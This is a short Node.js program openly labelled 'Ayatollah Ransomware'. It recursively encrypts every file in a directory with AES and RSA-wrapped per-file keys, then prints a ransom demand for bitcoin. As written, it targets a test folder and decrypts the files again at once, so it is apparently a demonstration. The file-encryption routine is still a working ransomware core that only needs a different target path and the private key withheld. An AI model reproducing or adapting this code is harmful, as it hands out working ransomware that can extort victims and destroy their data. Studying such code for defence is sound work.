const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

// Generate RSA key pair
function generateRsaKey() {
    const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
        modulusLength: 2048,
        publicKeyEncoding: { type: "spki", format: "pem" },
        privateKeyEncoding: { type: "pkcs8", format: "pem" },
    });
    return { publicKey, privateKey };
}

// Encrypt AES key with RSA
function encryptAesKey(rsaPublicKey, aesKey) {
    return crypto.publicEncrypt(
        {
            key: rsaPublicKey,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: "sha256",
        },
        aesKey
    );
}

// Decrypt AES key with RSA
function decryptAesKey(rsaPrivateKey, encryptedKey) {
    return crypto.privateDecrypt(
        {
            key: rsaPrivateKey,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: "sha256",
        },
        encryptedKey
    );
}

// Encrypt file with AES
function encryptFile(filePath, aesKey) {
    const iv = crypto.randomBytes(16); // Generate a random IV
    const cipher = crypto.createCipheriv("aes-256-cfb", aesKey, iv);

    const fileData = fs.readFileSync(filePath);
    const encryptedData = Buffer.concat([iv, cipher.update(fileData), cipher.final()]);

    fs.writeFileSync(filePath, encryptedData);
}

// Decrypt file with AES
function decryptFile(filePath, aesKey) {
    const fileData = fs.readFileSync(filePath);
    const iv = fileData.slice(0, 16); // Extract the IV
    const encryptedData = fileData.slice(16);

    const decipher = crypto.createDecipheriv("aes-256-cfb", aesKey, iv);
    const decryptedData = Buffer.concat([decipher.update(encryptedData), decipher.final()]);

    fs.writeFileSync(filePath, decryptedData);
}

// Encrypt directory
function encryptDirectory(directory, rsaPublicKey) {
    fs.readdirSync(directory, { withFileTypes: true }).forEach((dirent) => {
        const filePath = path.join(directory, dirent.name);

        if (dirent.isDirectory()) {
            encryptDirectory(filePath, rsaPublicKey);
        } else if (dirent.isFile()) {
            console.log(`Encrypting: ${filePath}`);

            const aesKey = crypto.randomBytes(32); // Generate a random AES key
            encryptFile(filePath, aesKey);

            const encryptedKey = encryptAesKey(rsaPublicKey, aesKey);
            fs.writeFileSync(`${filePath}.key`, encryptedKey);
        }
    });
}

// Decrypt directory
function decryptDirectory(directory, rsaPrivateKey) {
    fs.readdirSync(directory, { withFileTypes: true }).forEach((dirent) => {
        const filePath = path.join(directory, dirent.name);

        if (dirent.isDirectory()) {
            decryptDirectory(filePath, rsaPrivateKey);
        } else if (dirent.isFile() && !filePath.endsWith(".key")) {
            const keyFilePath = `${filePath}.key`;

            if (!fs.existsSync(keyFilePath)) {
                console.log(`Key file missing for: ${filePath}`);
                return;
            }

            console.log(`Decrypting: ${filePath}`);

            const encryptedKey = fs.readFileSync(keyFilePath);
            const aesKey = decryptAesKey(rsaPrivateKey, encryptedKey);
            decryptFile(filePath, aesKey);
        }
    });
}

// Main function
function main() {
    console.log("Ayatollah Ransomware Start");

    const { publicKey, privateKey } = generateRsaKey();

    // Encrypt directory
    encryptDirectory("C:\\test", publicKey);

    // Display ransom message
    console.log("\n\n========================================");
    console.log("Every file is encrypted!");
    console.log("Send 0.01 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
    console.log("Don't try this at home");
    console.log("========================================\n\n");

    // Decrypt directory
    console.log("Starting decryption...");
    decryptDirectory("C:\\test", privateKey);
}

main();